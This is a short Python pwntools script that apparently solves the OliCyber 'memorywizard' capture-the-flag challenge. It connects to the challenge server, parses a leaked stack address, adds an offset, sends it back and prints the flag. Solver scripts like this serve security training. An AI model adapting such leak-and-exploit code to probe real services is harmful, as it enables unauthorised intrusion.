#!/usr/bin/env python3
from pwn import *

r = remote("memorywizard.challs.olicyber.it", 21001)
r.recvuntil(b"to ") # read until the stack leak
stack_leak = int(r.recv(len("0x") + 6 * 2), 16)
stack_leak += 0x8
r.recvuntil(b': ')
r.sendline(hex(stack_leak).encode())
r.recvuntil(b': ')
flag = r.recvline().strip().decode()
print(flag)
